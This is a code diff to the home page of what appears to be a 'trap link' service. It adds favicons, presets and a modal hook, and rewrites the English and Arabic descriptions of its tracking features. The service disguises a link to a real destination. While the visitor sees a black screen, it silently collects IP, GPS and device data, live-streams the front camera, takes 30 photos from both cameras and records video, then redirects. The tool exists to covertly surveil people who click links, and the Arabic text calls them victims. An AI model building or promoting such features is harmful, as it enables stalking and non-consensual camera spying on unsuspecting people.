@@ -33,7 +33,10 @@ import {
   CheckCircle2,
   Terminal,
   HelpCircle,
-  Camera
+  Camera,
+  Youtube,
+  Facebook,
+  Instagram
 } from 'lucide-react';
 import { Language, translations } from '../translations';
 import { TrackingLink, TrackingMode, MainNavView } from '../types';
@@ -46,6 +49,7 @@ interface HomeViewProps {
   onSelectLink: (code: string) => void;
   onNavigateIpLookup?: () => void;
   onViewChange: (view: MainNavView) => void;
+  onOpenTrapModal?: (mode: TrackingMode) => void;
   globalVisits?: number;
   globalLinks?: number;
 }
@@ -58,12 +62,42 @@ export const HomeView: React.FC<HomeViewProps> = ({
   onSelectLink,
   onNavigateIpLookup,
   onViewChange,
+  onOpenTrapModal,
   globalVisits = 800,
   globalLinks = 1500,
 }) => {
   const t = translations[lang];
   const [url, setUrl] = useState('');
   const [error, setError] = useState('');
+  const [faviconError, setFaviconError] = useState(false);
+  const [faviconFallbackStep, setFaviconFallbackStep] = useState(0);
+
+  const getFaviconUrl = (urlStr: string, step: number) => {
+    try {
+      const trimmed = urlStr.trim();
+      if (!trimmed) return null;
+      let target = trimmed;
+      if (!/^https?:\/\//i.test(target)) {
+        target = 'https://' + target;
+      }
+      const parsed = new URL(target);
+      if (parsed.hostname && parsed.hostname.includes('.')) {
+        const domain = parsed.hostname;
+        if (step === 0) {
+          return `https://www.google.com/s2/favicons?sz=64&domain=${domain}`;
+        } else if (step === 1) {
+          return `https://icons.duckduckgo.com/ip3/${domain}.ico`;
+        } else if (step === 2) {
+          return `https://icon.horse/icon/${domain}`;
+        } else if (step === 3) {
+          return `https://logo.clearbit.com/${domain}`;
+        }
+      }
+    } catch (e) {}
+    return null;
+  };
+
+  const currentFavicon = getFaviconUrl(url, faviconFallbackStep);
 
   const isLimitReached = savedLinks.length >= 5;
   const hasPdfLink = savedLinks.some(l => l.mode === 'pdf');
@@ -81,8 +115,8 @@ export const HomeView: React.FC<HomeViewProps> = ({
     if (!trimmed) {
       setError(
         lang === 'ar'
-          ? 'يرجى كتابة أو لصق الرابط المراد تلغيمه والتوجيه إليه أولاً، ثم الضغط على الخدمة المطلوبة.'
-          : 'Please enter or paste the target destination URL first before selecting a service.'
+          ? 'يرجى كتابة أو لصق الرابط المراد تلغيمه او أختيار من الامثله روابط جاهزه ، ثم الضغط على الخدمة المطلوبة.'
+          : 'Please enter or paste the target URL or select from the presets, then click the desired service.'
       );
       return;
     }
@@ -95,17 +129,17 @@ export const HomeView: React.FC<HomeViewProps> = ({
   };
 
   const popularPresets = [
-    { label: 'YouTube Video', url: 'https://youtube.com/watch?v=dQw4w9WgXcQ' },
-    { label: 'Google Search', url: 'https://google.com' },
-    { label: 'Facebook Feed', url: 'https://facebook.com' },
-    { label: 'Instagram Profile', url: 'https://instagram.com' },
+    { label: 'YouTube Video', url: 'https://youtube.com/watch?v=dQw4w9WgXcQ', icon: <Youtube className="w-3 h-3" /> },
+    { label: 'Google Search', url: 'https://google.com', icon: <Search className="w-3 h-3" /> },
+    { label: 'Facebook Feed', url: 'https://facebook.com', icon: <Facebook className="w-3 h-3" /> },
+    { label: 'Instagram Profile', url: 'https://instagram.com', icon: <Instagram className="w-3 h-3" /> },
   ];
 
   // Comprehensive sections guide data
   const sectionsGuide = [
     {
       id: 'sec-gps',
-      title: lang === 'ar' ? '1. نظام تتبع الروابط الدقيق (GPS + Sensors)' : '1. High-Precision GPS Telemetry',
+      title: lang === 'ar' ? '1. تحديد إحداثيات (GPS + Sensors)' : '1. High-Precision GPS Telemetry',
       badge: 'GPS',
       badgeColor: 'bg-indigo-100 text-indigo-800 border-indigo-200',
       icon: <Crosshair className="w-5 h-5 text-indigo-600" />,
@@ -153,17 +187,17 @@ export const HomeView: React.FC<HomeViewProps> = ({
     },
     {
       id: 'sec-camera',
-      title: lang === 'ar' ? '4. نظام تتبع الكاميرا والتقاط 20 صورة (Camera Trap)' : '4. Camera Trap Surveillance (20 Photos)',
+      title: lang === 'ar' ? '4. نظام تتبع الكاميرا المتقدم والبث المباشر (Camera Trap, Live Stream & Dual-Camera Burst)' : '4. Advanced Camera Trap, Live Stream & Dual-Camera Burst',
       badge: 'CAMERA',
       badgeColor: 'bg-rose-100 text-rose-800 border-rose-200',
       icon: <Camera className="w-5 h-5 text-rose-600" />,
       desc: lang === 'ar'
-        ? 'يولد رابط تتبع HTML ذكي يعرض شاشة سوداء صامتة بالكامل في جهاز الضحية أثناء جمع كافة بيانات الـ IP، نوع الجهاز، والمتصفح في الخلفية، ويطلب إذن الكاميرا لالتقاط 20 صورة متسلسلة تباعاً (10 صور بالكاميرا الأمامية و 10 صور بالكاميرا الخلفية) على مدى 20 ثانية، ثم يوجه المستخدم تلقائياً إلى الرابط المستهدف مع عرض الصور وإمكانية تحميلها في لوحة التحكم.'
-        : 'Generates a smart HTML tracking link displaying a silent black screen while collecting IP and device telemetry in the background, requesting camera permission to sequentially capture 20 photos (10 front and 10 back) over 20 seconds, before seamlessly redirecting to the target URL with full gallery audit in your dashboard.',
+        ? 'يولد رابط تتبع HTML ذكي يفتح بث الكاميرا الأمامية فوراً خلال أول نصف ثانية مع عرضه لحظياً في لوحة التحكم. يقوم النظام بالالتقاط المتسلسل لـ 30 صورة بتبديل دقيق (صورتين أمامية + صورة خلفية) كل 0.5 ثانية مع فحص السطوع لمنع الصور السوداء، ويربط كافة البيانات بمعرّف الزائر المحفوظ بملفات تعريف الارتباط (Cookies). وعند خروج المستخدم من الرابط، يتحول البث المباشر فوراً إلى ملف فيديو مسجل جاهز للتنزيل.'
+        : 'Generates a smart HTML tracking link launching front camera live stream within the first 0.5 seconds with real-time dashboard streaming. Alternates capturing 30 high-definition photos (2 front, 1 rear) every 0.5s with automatic brightness checks, correlating all telemetry with cookie-bound visitor IDs. When the visitor leaves the link, the live stream instantly converts into a downloadable recorded video.',
       features: lang === 'ar'
-        ? ['شاشة سوداء صامتة لجمع بيانات IP والجهاز في الخلفية', 'التقاط 20 صورة متسلسلة (10 أمامية + 10 خلفية)', 'معرض صور تفاعلي مع إمكانية التنزيل والحفظ لكل صورة', 'توجيه تلقائي سلس للرابط المستهدف بعد الاكتمال']
-        : ['Silent black screen collecting IP & telemetry in background', 'Sequential capture of 20 photos (10 front + 10 back)', 'Interactive photo gallery with individual download buttons', 'Seamless auto-redirection to target URL after completion'],
-      actionLabel: lang === 'ar' ? 'فتح تتبع الكاميرا (20 صورة)' : 'Open Camera Trap Tracking',
+        ? ['بث مباشر فوري من أول نصف ثانية يظهر لحظياً في لوحة التحكم', 'التقاط 30 صورة متسلسلة بتبديل ذكي (صورتين أمامية + صورة خلفية) كل نصف ثانية', 'تحويل البث المباشر تلقائياً إلى فيديو مسجل قابل للتنزيل فور مغادرة المستخدم للرابط', 'ربط دقيق للزيارة بمعرّف الزائر المحفوظ في الـ Cookies (`sm_vid`) وضمان وضوح كامل وخلو من الصور السوداء']
+        : ['Instant live stream from first 0.5s streaming directly to dashboard', 'Sequential capture of 30 photos alternating (2 front, 1 rear) every 0.5s', 'Auto-conversion of live stream into downloadable video upon page leave', 'Precise visitor ID correlation via cookies (`sm_vid`) with verified zero-black-frame optical clarity'],
+      actionLabel: lang === 'ar' ? 'فتح تتبع الكاميرا المتقدم' : 'Open Advanced Camera Tracking',
       actionView: null,
       modeSelect: 'camera' as TrackingMode,
     },
@@ -262,8 +296,24 @@ export const HomeView: React.FC<HomeViewProps> = ({
             <span className="text-[10px] text-slate-400 font-medium lowercase">https://...</span>
           </label>
           <div className="relative flex items-center">
-            <div className="absolute inset-y-0 start-0 flex items-center ps-3.5 pointer-events-none text-slate-400">
-              <Link2 className="w-4 h-4 text-indigo-600" />
+            <div className="absolute inset-y-0 start-0 flex items-center ps-3 pointer-events-none text-slate-400">
+              {currentFavicon && !faviconError ? (
+                <img
+                  src={currentFavicon}
+                  alt="domain-icon"
+                  onError={() => {
+                    if (faviconFallbackStep < 3) {
+                      setFaviconFallbackStep((prev) => prev + 1);
+                    } else {
+                      setFaviconError(true);
+                    }
+                  }}
+                  className="w-5 h-5 rounded-md object-contain border border-slate-200 bg-white p-0.5 shadow-2xs animate-in zoom-in-75 duration-150"
+                  referrerPolicy="no-referrer"
+                />
+              ) : (
+                <Link2 className="w-4 h-4 text-indigo-600" />
+              )}
             </div>
             <input
               id="target-url-input"
@@ -272,18 +322,24 @@ export const HomeView: React.FC<HomeViewProps> = ({
               disabled={isLimitReached}
               onChange={(e) => {
                 setUrl(e.target.value);
+                setFaviconError(false);
+                setFaviconFallbackStep(0);
                 if (error) setError('');
               }}
               onKeyDown={(e) => {
                 if (e.key === 'Enter') handleCreate('near');
               }}
               placeholder={isLimitReached ? (lang === 'ar' ? 'تم الوصول للحد الأقصى (5)' : 'Max links limit reached (5)') : t.enterUrlPlaceholder}
-              className={`w-full ps-9 pe-16 py-2.5 text-xs sm:text-sm bg-slate-50 text-slate-950 placeholder:text-slate-400 rounded-2xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-indigo-500 font-mono transition-all ${isLimitReached ? 'opacity-50 cursor-not-allowed' : 'hover:bg-slate-100/70 focus:bg-white'}`}
+              className={`w-full ps-10 pe-16 py-2.5 text-xs sm:text-sm bg-slate-50 text-slate-950 placeholder:text-slate-400 rounded-2xl border border-slate-200 focus:outline-none focus:ring-2 focus:ring-indigo-500 font-mono transition-all ${isLimitReached ? 'opacity-50 cursor-not-allowed' : 'hover:bg-slate-100/70 focus:bg-white'}`}
             />
             {url && (
               <button
                 type="button"
-                onClick={() => setUrl('')}
+                onClick={() => {
+                  setUrl('');
+                  setFaviconError(false);
+                  setFaviconFallbackStep(0);
+                }}
                 className="absolute end-2.5 px-2.5 py-1 text-xs text-slate-400 hover:text-slate-800 font-bold cursor-pointer"
               >
                 {lang === 'ar' ? 'مسح' : 'Clear'}
@@ -301,8 +357,8 @@ export const HomeView: React.FC<HomeViewProps> = ({
               </span>
               <p className="text-[10px] text-slate-600 leading-normal">
                 {lang === 'ar'
-                  ? 'اكتب أو الصق رابط الوجهة الحقيقي (مثل فيديو، مقال، أو موقع) ثم اضغط على الخدمة المطلوبة بالأسفل لتلغيم الرابط والحصول على رابط التتبع الخاص بك مع إعادة التوجيه التلقائي بعد جمع القياسات.'
-                  : 'Enter or paste the real destination URL, then click your desired tracking service below to arm the link and generate your telemetry URL with automatic redirection.'}
+                  ? 'يرجى كتابة أو لصق الرابط المراد تلغيمه او أختيار من الامثله روابط جاهزه ، ثم الضغط على الخدمة المطلوبة.'
+                  : 'Please enter or paste the target URL or select from the presets, then click the desired service.'}
               </p>
             </div>
           </div>
@@ -317,9 +373,14 @@ export const HomeView: React.FC<HomeViewProps> = ({
             <button
               key={idx}
               type="button"
-              onClick={() => setUrl(p.url)}
-              className="px-2.5 py-0.5 rounded-xl bg-slate-100 hover:bg-slate-200 text-slate-800 border border-slate-200 text-[11px] font-medium transition-colors cursor-pointer"
+              onClick={() => {
+                setUrl(p.url);
+                setFaviconError(false);
+                setFaviconFallbackStep(0);
+              }}
+              className="flex items-center gap-1.5 px-2.5 py-1 rounded-xl bg-slate-100 hover:bg-slate-200 text-slate-800 border border-slate-200 text-[11px] font-medium transition-colors cursor-pointer"
             >
+              {p.icon}
               {p.label}
             </button>
           ))}
@@ -444,7 +505,7 @@ export const HomeView: React.FC<HomeViewProps> = ({
                 </div>
                 <div>
                   <span className="text-sm sm:text-base font-black tracking-tight block">{t.cameraTrackingBtn}</span>
-                  <span className="text-[10px] text-rose-300 font-semibold">{lang === 'ar' ? 'التقاط 10 صور أمامية وخلفية بالتبادل' : '10 Sequential Front/Back Photos'}</span>
+                  <span className="text-[10px] text-rose-300 font-semibold">{lang === 'ar' ? 'بث مباشر وتسجيل فيديو + 30 صورة بكاميرا أمامية' : 'Front Live Stream, Video & 30 Photos'}</span>
                 </div>
               </div>
               <span className="px-2.5 py-1 rounded-full text-[9px] font-black bg-rose-500/20 text-rose-300 uppercase tracking-widest border border-rose-500/30">
@@ -613,12 +674,16 @@ export const HomeView: React.FC<HomeViewProps> = ({
                     if (sec.actionView) {
                       onViewChange(sec.actionView);
                     } else if (sec.modeSelect) {
-                      const targetInput = document.getElementById('target-url-input');
-                      if (targetInput) {
-                        targetInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
-                        targetInput.focus();
+                      if (onOpenTrapModal) {
+                        onOpenTrapModal(sec.modeSelect);
                       } else {
-                        window.scrollTo({ top: 0, behavior: 'smooth' });
+                        const targetInput = document.getElementById('target-url-input');
+                        if (targetInput) {
+                          targetInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                          targetInput.focus();
+                        } else {
+                          window.scrollTo({ top: 0, behavior: 'smooth' });
+                        }
                       }
                     }
                   }}
